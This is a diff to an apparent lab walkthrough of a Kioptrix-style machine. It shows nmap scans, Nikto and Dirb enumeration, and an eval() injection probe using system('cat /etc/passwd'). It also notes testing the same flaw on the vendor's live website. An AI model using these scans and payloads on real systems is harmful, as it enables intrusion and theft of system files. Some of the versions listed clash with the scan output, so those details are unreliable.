@@ -321,3 +321,40 @@ rtt min/avg/max/mdev = 0.009/0.018/0.026/0.007 ms, pipe 2
 uid=0(root) gid=0(root) groups=48(apache)
 </pre>*
     The previous request wgets the exploit, compiles it and pipes the id command to the resulting root bash.
+
+Level 3
+    First, host discovery scan:
+    *# nmap -sP 192.168.0.1/24
+...
+Host is up (0.000072s latency).
+MAC Address: 00:0C:29:88:0D:15 (VMware)*
+
+    Service identification scan:
+    *s# nmap -A -sS -T5 192.168.0.9
+Nmap scan report for 192.168.0.9
+Host is up (0.00033s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33*
+
+    So it runs SSH, and a web server, smaller attack surcace than the previous machines. We connect to the web server using the browser and we see it runs a CMS called LotusCMS.
+    I run Nikto and Dirb against it and find a phpMyAdmin interface at *http://192.168.0.9/phpmyadmin/*I look for known exploits for PhpMyAdmin 2.11.3, Suhosin-Patch, Php 5.5.25, Apache 2.4.12, but do not find anything useful.
+
+    I play a bit with the web interface and there are a couple of interesting parameter the first URL is
+    *http://192.168.0.9/index.php?page=index*
+
+    I see how the server responds to different invalid input, specifically I try inputs like *./index* and *./././index* to see if the server is canonicalizing the path. Nothing interesting is found. The next interesting URL is:
+    *http://192.168.0.9/index.php?system=Admin*
+
+    I issue the same request with *./Admin* and get the following response:
+
+    *Parse error: syntax error, unexpected '.', expecting T_STRING or T_VARIABLE or '$' in /home/www/kioptrix3.com/core/lib/router.php(26) : eval()'d code on line 1*
+
+    Wow looks like the input hits the PHP function eval. I try multiple inputs such as:
+
+    *http://192.168.0.9/index.php?system=system("cat /etc/passwd");*
+
+    I go to the main vendor site http://www.lotuscms.org/ and find that their site has the same issue, which means it is probably not the solution to the challenge.
